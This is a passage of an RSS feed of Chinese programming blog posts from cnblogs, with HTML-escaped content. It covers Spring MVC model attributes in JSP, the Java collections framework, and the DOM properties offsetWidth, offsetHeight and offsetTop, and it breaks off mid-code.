&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;meta &lt;/span&gt;&lt;span&gt;http-equiv&lt;/span&gt;&lt;span&gt;=&quot;Content-Type&quot;&lt;/span&gt;&lt;span&gt; content&lt;/span&gt;&lt;span&gt;=&quot;text/html; charset=utf-8&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Insert title here&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
姓名:${mymap.user.name}&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;br&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
密码:${mymap.user.pwd}&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;br&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
出生日期:${mymap.user.birthday}&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;br&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
名字:${mymap.name}&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;br&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
名字:${requestScope.mymap.name}&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;br&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
姓名:${requestScope.mymap.user.name}&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;br&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
SessionAttributes:${sessionScope.user.name}
&lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;body&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;html&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/733213/201804/733213-20180415221102606-717496950.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/733213/201804/733213-20180415221114592-2016867147.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如果我们想将里面的user设置为sessionAttribute，我们可以@SessionAttributes({&quot;user&quot;,&quot;mymap&quot;}),SessionAttributes:${sessionScope.mymap.user.name}来获取。&lt;/p&gt;
&lt;p&gt;2)、无返回值&lt;/p&gt;
&lt;p&gt; 若方法返回一个void类型，则还必须自行将实例添加到Model中。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;    @ModelAttribute
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; voidmap(Model model) {
      User user&lt;/span&gt;=&lt;span&gt;new&lt;/span&gt;&lt;span&gt; User();
      user.setName(&lt;/span&gt;&quot;cuiyw3&quot;&lt;span&gt;);
      user.setPwd(&lt;/span&gt;&quot;ModelAttribute3&quot;&lt;span&gt;);
      user.setBirthday(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Date());
      HashMap&lt;/span&gt;&amp;lt;String, Object&amp;gt; map=&lt;span&gt;new&lt;/span&gt; HashMap&amp;lt;String, Object&amp;gt;&lt;span&gt;();
      map.put(&lt;/span&gt;&quot;name&quot;,&quot;cyw3&quot;&lt;span&gt;);
      map.put(&lt;/span&gt;&quot;user&quot;&lt;span&gt;,user);
      model.addAttribute(&lt;/span&gt;&quot;mymap&quot;&lt;span&gt;,map);
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/733213/201804/733213-20180415222822888-979632642.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 15 Apr 2018 15:21:00 +0000</pubDate>
<dc:creator>社会主义接班人</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/5ishare/p/8849429.html</dc:identifier>
</item>
<item>
<title>java集合框架 - 博客新手123</title>
<link>http://www.cnblogs.com/lyz-999/p/8850159.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lyz-999/p/8850159.html</guid>
<description>&lt;p align=&quot;left&quot;&gt;&lt;span&gt;&lt;strong&gt;集合框架&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;用来表示和操作集合的统一架构
包含三个方面：
1、接口：定义了集合操作的规范
2、实现类：集合接口的具体实现，本质上，是可重复使用的数据结构
3、算法： 实现集合操作的常用算法&lt;/span&gt;&lt;span/&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;table border=&quot;2&quot; align=&quot;left&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td rowspan=&quot;2&quot;&gt;&lt;span&gt;接口&lt;/span&gt;&lt;/td&gt;
&lt;td colspan=&quot;2&quot;&gt;&lt;span&gt;Collection&lt;/span&gt;&lt;/td&gt;
&lt;td rowspan=&quot;2&quot;&gt;&lt;span&gt;Map&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;List&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;Set&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td rowspan=&quot;3&quot;&gt;&lt;span&gt;实现类&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;ArrayList,   Vector&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;HashSet&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;HashMap, HashTable&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;LInkedArrayList&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;LinkedHashSet&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;LinkedHashMap&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt; &lt;/td&gt;
&lt;td&gt;&lt;span&gt;TreeSet&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;TreeMap&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;







&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;[四个接口区别]
&lt;/span&gt;&lt;span&gt;1、collection： 存储不唯一、无序的数据 
2、list： 存储不唯一、有序的数据
3、set： 存储唯一、无序的数据
4、Map： 以键值的形式存储数据，以键取值，键不能重复，值可以重复 &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;hr/&gt;&lt;p align=&quot;left&quot;&gt;&lt;span&gt;&lt;strong&gt;[list&lt;/strong&gt;&lt;strong&gt;接口]&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt;1、常用方法：
  ① add();在列表最后添加元素
  ② add(index,obj);在列表指定位置添加元素
  ③ size();返回列表元素个数
  ④ get(int index);返回下标为index的元素。
                   如果没有泛型约束，返回object类型，需要强转；
                   如果有泛型约束，直接返回返回类型，无需强转。
  ⑤ clear();清除列表中所有数据
     isEmpty();检测列表是否为空
  ⑥ contains();传入一个对象，检测列表中是否包含该对象
               如果传入的是String 和基本数据类型，可以直接比对
               如果传入的是实体对象，则默认值比对两个对象的地址，因此需要在实体类中重写equals()方法
  ⑦ indexOf()传入一个对象，返回该对象在列表中是第一次出现的位置,如果没有则返回-1
     lastIndexOf();返回最后一次出现的位置
  ⑧ remove();传入一个下标，或者一个对象，删除指定元素；
              如果传入下标，返回被删除的元素对象，如果下标大于size(),会报下标越界
              如果传入对象，则要求重写equals()方法，返回true或false表示是否删除成功
  ⑨ set(index,obj):用新传入的对象，将指定位置的元素替换掉，返回被替换的元素
  ⑩ list.subList(1,3);截取一个子列表，返回List类型
     toArray();将列表转为数组，返回一个Object[]类型的数组

2、常用实现类
  ① ArrayList
      实现了一个长度可变的数组，在内存空间中开辟一串连续的空间。
      这种存储结构，在循环遍历和随机访问元素的速度比较快
  ② LinkedList
      使用链表结构存储数据，在(中间)插入和删除元素时比较快
  &lt;/span&gt;&lt;span&gt;LinkedList特有的方法：&lt;/span&gt;&lt;span&gt;
   ① addFirst():在该列表开头插入指定的元素。
       addLast():在该列表最后插入指定的元素。
   ② removeFirst();从此列表中删除并返回第一个元素。
       removeLast();从此列表中删除并返回最后一个元素。
   ③ getFirst();返回第一个元素。
       getLast();返回最后一个元素。&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;&lt;strong&gt;[Set&lt;/strong&gt;&lt;strong&gt;接口] &lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;50.5&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt;1、常用方法：与List接口基本相同 但是，由于Set接口中的元素是无序的，因此没有与下标相关的方法
   例如：get(index) remove(index) add(index,obj)
2、Set接口特点：无序、唯一
3、HashSet 底层是调用HashMap的相关方法，传入数据后，根据数据的hashcode进行散列运算，得到一个散列值后再进行运算，确定元素在序列中存储的位置
  HashSet如何确定两个对象是否相等
&lt;/span&gt;&lt;span&gt;&lt;span&gt;  ① 先判断对象的HashCode(),如果hashcode不同，那肯定不相同
    如果hashcode相等，那继续判断equals()方法
  ②重写equals()方法
  &amp;gt;&amp;gt;&amp;gt;所以，使用HashSet存储实体对象时，必须重写HashCode()和equals()两个方法
4、LinkHashSet：在HashSet的基础上，新增了一个链表。
   用链表来记录HashSet存放的元素顺序，因此使用迭代器遍历时，可以按照放入的顺序依次读取元素
5、TreeSet：将存入的元素，进行排序，然后再输出
   如果存入的是实体对象，那么实体类必须实现Comparable接口，重写CompareTo()方法
   或者，也可以在实例化TreeSet的同时，通过构造函数传入一个比较器
   比较器：一个实现了Comparator接口，并重写了compare()方法的实现类的对象。&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p align=&quot;left&quot;&gt;  &lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;使用匿名内部类，拿到一个比较器对象&lt;/span&gt;
&lt;span&gt;
   Set&lt;/span&gt;&amp;lt;Person&amp;gt; set=&lt;span&gt;new&lt;/span&gt; TreeSet&amp;lt;Person&amp;gt;(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Comparator(){

   &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; compare(Person p1,Person p2){

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; p1.getId()-&lt;span&gt;p2.getId();

          }

     }

  );

   &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;自定义一个比较类，实现Comparator接口 &lt;/span&gt;

  &amp;lt;Person&amp;gt; set=&lt;span&gt;new&lt;/span&gt; TreeSet&amp;lt;Person&amp;gt;(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Compare());

   &lt;/span&gt;&lt;span&gt;class&lt;/span&gt; Compare &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; Comparator{

      &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 重写compare方法。&lt;/span&gt;

   &lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; compare(Person p1,Person p2){

      &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; p1.getId()-&lt;span&gt;p2.getId();

    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p align=&quot;left&quot;&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;[Comparable接口 和 Comparator接口的区别]&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt; &lt;span&gt;1、Comparable由实体类实现，重写compareTo()方法；&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;   实体类实现Comparable接口以后，TreeSet使用空参构造即可。&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt; 2、Comparator需要单独一个比较类进行实现，重写Compare()方法。&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;   实例化TreeSet的时候，需要传入这个比较类的对象。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;&lt;strong&gt;[Map&lt;/strong&gt;&lt;strong&gt;接口]&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41.5&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt;1、特点：以键值对的形式存储数据，以键取值。 键不能重复，只可以重复
2、Map常用的方法
  ① put(key,value):向map的在最后追加一个键值对； 
  ② get(key); 通过建，取值
  ③ clear(); 清除所有键值对；
  ④ containsValue(obj);检测是否包含指定的值
     containsKey(obj);检测是否包含指定的键  
3、LinkedHashMap
   可以使用链表，记录数据放入的顺序，使让读出的数据次序与存入的次序一致，与LinkedHashSet一样
4、TreeMap
   根据键的顺序，进行排序后，输出。如果传入的是实体对象，必须重写比较函数，详见TreeSet

&lt;strong&gt;[HashMap与HashTable的区别]&lt;/strong&gt;
1、HashTable是线程安全(线程同步)的，HashMap是线程不安全(线程不同步)的
2、HashTable的键不能为null,HashMap的键可以为null
3、HashMap继承了AbstractMap，HashTable继承Dictionary抽象类，两者均实现Map接口。
4、HashMap的初始容量为16，Hashtable初始容量为11，两者的填充因子默认都是0.75。
5、HashMap扩容时是当前容量翻倍即:capacity*2，Hashtable扩容时是容量翻倍+1即:capacity*2+1。
6、两者计算hash的方法不同： 
   Hashtable计算hash是直接使用key的hashcode对table数组的长度直接进行取模：
   HashMap计算hash对key的hashcode进行了二次hash，以获得更好的散列值，然后对table数组长度取摸：
7、判断是否含有某个键 
  在HashMap 中，null 可以作为键，这样的键只有一个；可以有一个或多个键所对 应的值为null。当get()方法返回null 值时，&lt;br/&gt;既可以表示HashMap 中没有该键，也可以表示该键所对应的值为null。因此，在HashMap 中不能用get()方法来判断HashMap中是否存在某个键，、&lt;br/&gt;而应该用containsKey()方法来判断。Hashtable 的键值都不能&lt;/span&gt;&lt;span&gt;为null，所以可以用get()方法来判断是否含有某个键。&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 遍历Map方式一
         &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        Set&lt;/span&gt;&amp;lt;String&amp;gt; keys =&lt;span&gt; map1.keySet();
        Iterator&lt;/span&gt;&amp;lt;String&amp;gt; iter1 =&lt;span&gt; keys.iterator();
        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; (iter1.hasNext()) {
            String key &lt;/span&gt;=&lt;span&gt; iter1.next();
            System.out.println(key &lt;/span&gt;+ &quot;------&quot; +&lt;span&gt; map1.get(key));
        }

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 遍历Map方式二
         &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        Collection&lt;/span&gt;&amp;lt;String&amp;gt; values =&lt;span&gt; map1.values();
        Iterator&lt;/span&gt;&amp;lt;String&amp;gt; iter2 =&lt;span&gt; values.iterator();
        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; (iter2.hasNext()) {
            System.out.println(iter2.next());
        }

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 遍历Map方式三
         &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        Set&lt;/span&gt;&amp;lt;Entry&amp;lt;String, String&amp;gt;&amp;gt; set3 =&lt;span&gt; map1.entrySet();
        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;Iterator&amp;lt;Entry&amp;lt;String,String&amp;gt;&amp;gt; iter3 = set3.iterator();
        while (iter3.hasNext()) {
            Entry&amp;lt;String,String&amp;gt; entry=iter3.next();
            Entry是java给我们提供的一种特殊的数据类型，其实就是一个键值对
             * 键就是当前这条记录的键，使用getKey()取到；
             * 值就是当前这条记录的值，使用getValue()取到
            
//            System.out.println(entry);
            System.out.println(entry.getKey()+&quot;---&quot;+entry.getValue());
        }&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;for&lt;/span&gt;(Entry&amp;lt;String,String&amp;gt;&lt;span&gt;entry:set3){
            System.out.println(entry.getKey()&lt;/span&gt;+&quot;-----&quot;+&lt;span&gt;entry.getValue());
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;&lt;strong&gt;[Collections&lt;/strong&gt;&lt;strong&gt;类]&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;Collections是Java中专门用来操作集合的工具类
Collection是一个接口&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;66&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt;[方法]
1&lt;/span&gt;&lt;span&gt;&lt;span&gt;、addAll()方法：向集合中添加多个数据&lt;/span&gt;
  Collections.addAll(list, &lt;/span&gt;&quot;Test1&quot;,&quot;Test2&quot;,&quot;Test3&quot;&lt;span&gt;);

&lt;/span&gt;&lt;span&gt;2、sort()方法：对集合中的数据进行排序 如果集合中的数据是实体对象那么 
  ① 实体类实现Comparable接口，重写compareTo方法
  ②在sort的第二个参数传入一个实现了Comparator接口的比较器对象，重写compare方法&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;    Collections.sort(list1, new Comparator&amp;lt;Person1&amp;gt;() {&lt;br/&gt;     @Override&lt;br/&gt;      public int compare(Person1 o1, Person1 o2) {&lt;br/&gt;      return o1.getId() - o2.getId();&lt;br/&gt;      }&lt;br/&gt;    });&lt;/p&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;&lt;span&gt;、binarySearch()：查找元素，返回下标
  使用binarySearch()要先排序 如果集合中的数据是实体对象那么 
  ①实体类实现Comparable接口，重写compareTo方法 (推荐使用)
  ②在sort的第二个参数和binarySearch的第三个参数传入一个实现了Comparator接口的比较器对象，重写compare方法&lt;/span&gt;
  System.out.println(Collections.binarySearch(list, &lt;/span&gt;&quot;list2&quot;&lt;span&gt;));

&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;&lt;span&gt;&lt;span&gt;、找出最大、最小元素，如果实体对象，同上需要实现比较器接口&lt;/span&gt;
  Collections.max(list);
  System.out.println(Collections.min(list1));

&lt;/span&gt;&lt;span&gt;5&lt;/span&gt;&lt;span&gt;&lt;span&gt;、repalceAll(): 将列表的指定值，替换新值. 如果是对象，重写equals方法&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;     Collections.replaceAll(list1, new Person1(1, &quot;张三&quot;, 12),&lt;br/&gt;     new Person1(1, &quot;111张三&quot;, 12));&lt;/p&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt;6&lt;/span&gt;&lt;span&gt;&lt;span&gt;、翻转列表中的所有元素&lt;/span&gt;
  Collections.reverse(list1);

&lt;/span&gt;&lt;span&gt;7&lt;/span&gt;&lt;span&gt;&lt;span&gt;、对集合的元素，随机排序&lt;/span&gt;
  Collections.shuffle(list1);&lt;br/&gt;&lt;/span&gt;&lt;span&gt;8&lt;/span&gt;&lt;span&gt;&lt;span&gt;、 将集合中的元素位置，进行交换&lt;/span&gt;
  Collections.swap(list1, &lt;/span&gt;0, 1&lt;span&gt;);

&lt;/span&gt;&lt;span&gt;9&lt;/span&gt;&lt;span&gt;&lt;span&gt;、将集合中的所有元素替换为同一个元素&lt;/span&gt;
  Collections.fill(list, &lt;/span&gt;&quot;姜皓真帅&quot;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p align=&quot;left&quot;&gt; &lt;/p&gt;

</description>
<pubDate>Sun, 15 Apr 2018 15:20:00 +0000</pubDate>
<dc:creator>博客新手123</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/lyz-999/p/8850159.html</dc:identifier>
</item>
<item>
<title>详解各种获取元素宽高及位置的属性 - laixiangran</title>
<link>http://www.cnblogs.com/laixiangran/p/8849887.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/laixiangran/p/8849887.html</guid>
<description>&lt;h2 id=&quot;offsetwidth-offsetheight&quot;&gt;offsetWidth / offsetHeight&lt;/h2&gt;
&lt;h3 id=&quot;offsetwidth&quot;&gt;offsetWidth&lt;/h3&gt;
&lt;p&gt;HTMLElement.offsetWidth 是一个只读属性，返回一个元素的布局宽度。一个典型的（各浏览器的offsetWidth可能有所不同）offsetWidth是测量包含元素的边框(border)、水平线上的内边距(padding)、竖直方向滚动条(scrollbar)（如果存在的话）、以及CSS设置的宽度(width)的值。&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; offsetWidth &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;element&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;offsetWidth&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/api/personal/file/3403949EF23A4165A295621E70E4AAEA?method=download&amp;amp;shareKey=cb35067568c854b1179977148689e8bb&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;offsetheight&quot;&gt;offsetHeight&lt;/h3&gt;
&lt;p&gt;HTMLElement.offsetHeight 是一个只读属性，它返回该元素的像素高度，高度包含该元素的垂直内边距和边框，且是一个整数。&lt;/p&gt;
&lt;p&gt;通常，元素的offsetHeight是一种元素CSS高度的衡量标准，包括元素的边框、内边距和元素的水平滚动条（如果存在且渲染的话），不包含:before或:after等伪类元素的高度。&lt;/p&gt;
&lt;p&gt;对于文档的body对象，它包括代替元素的CSS高度线性总含量高。浮动元素的向下延伸内容高度是被忽略的。&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; offsetHeight &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;element&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;offsetHeight&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/api/personal/file/9E5D8822E2EC4A58A60C17826387DBD2?method=download&amp;amp;shareKey=cb35067568c854b1179977148689e8bb&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;offsettop-offsetleft&quot;&gt;offsetTop / offsetLeft&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/api/personal/file/12B3BC8C95E846E584CBC6703A0A8FBF?method=download&amp;amp;shareKey=cb35067568c854b1179977148689e8bb&quot;/&gt;&lt;/p&gt;
&lt;p&gt;介绍这两个属性之前，先介绍下 offsetParent 属性，这样有助于理解。&lt;/p&gt;
&lt;h3 id=&quot;offsetparent&quot;&gt;offsetParent&lt;/h3&gt;
&lt;p&gt;HTMLElement.offsetParent 是一个只读属性，返回一个指向最近的（closest，指包含层级上的最近）包含该元素的定位元素。如果没有定位的元素，则 offsetParent 为最近的 table, table cell 或根元素（标准模式下为 html；quirks 模式下为 body）。当元素的 style.display 设置为 &quot;none&quot; 时，offsetParent 返回 null。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;offsetParent 很有用，因为 offsetTop 和 offsetLeft 都是相对于其内边距边界的。&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; offsetParent &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;element&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;offsetParent&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;offsettop&quot;&gt;offsetTop&lt;/h3&gt;
&lt;p&gt;HTMLElement.offsetTop 为只读属性，它返回当前元素相对于其 offsetParent 元素的顶部的距离。&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; offsetTop &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;element&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;offsetTop&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;offsetleft&quot;&gt;offsetLeft&lt;/h3&gt;
&lt;p&gt;HTMLElement.offsetLeft 是一个只读属性，返回当前元素左上角相对于 HTMLElement.offsetParent 节点的左边界偏移的像素值。&lt;/p&gt;
&lt;p&gt;对块级元素来说，offsetTop、offsetLeft、offsetWidth 及 offsetHeight 描述了元素相对于 offsetParent 的边界框。&lt;/p&gt;
&lt;p&gt;然而，对于可被截断到下一行的行内元素（如 span），offsetTop 和 offsetLeft 描述的是第一个边界框的位置（使用 &lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Web/API/Element/getClientRects&quot;&gt;Element.getClientRects()&lt;/a&gt; 来获取其宽度和高度），而 offsetWidth 和 offsetHeight 描述的是边界框的尺寸（使用 &lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Web/API/Element/getBoundingClientRect&quot;&gt;Element.getBoundingClientRect&lt;/a&gt; 来获取其位置）。因此，使用 offsetLeft、offsetTop、offsetWidth、offsetHeight 来对应 left、top、width 和 height 的一个盒子将不会是文本容器 span 的盒子边界。&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
